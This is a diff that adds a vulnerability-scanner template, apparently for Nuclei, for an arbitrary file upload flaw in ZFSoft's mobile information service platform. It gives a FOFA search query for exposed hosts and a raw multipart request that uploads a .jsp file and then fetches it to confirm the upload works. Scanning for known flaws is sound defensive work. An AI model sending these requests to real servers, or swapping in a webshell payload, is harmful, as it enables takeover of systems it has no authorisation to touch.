@@ -1,0 +1,55 @@
+id: zfsoft-mobile-oaMobilefjUploadByType-fileupload
+info:
+  name: 正方移动信息服务管理系统 oaMobile_fjUploadByType.html - fileupload
+  author: leadlife
+  severity: critical
+  description: 正方软件股份有限公司移动信息服务管理平台存在任意文件上传漏洞。攻击者可通过任意文件上传获取服务器权限。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%AD%A3%E6%96%B9/%E6%AD%A3%E6%96%B9%E7%A7%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FoaMobile_fjUploadByType%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true/false
+    fofa-query: title="移动信息服务管理" || body="URL=/zftal-mobile"
+  tags: zfsoft,fileupload
+
+variables:
+  num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - raw:
+      - |
+        POST /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Accept: */*
+        Content-Length: 457
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="yhm"
+
+        123
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="zid"
+
+        456
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="sign"
+
+        789
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{num}}.jsp"
+        Content-Type: text/plain
+
+        {{num}}
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |
+        GET /zftal-mobile/oaFjUploadByType/{{num}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body,'{{num}}')
+        condition: and
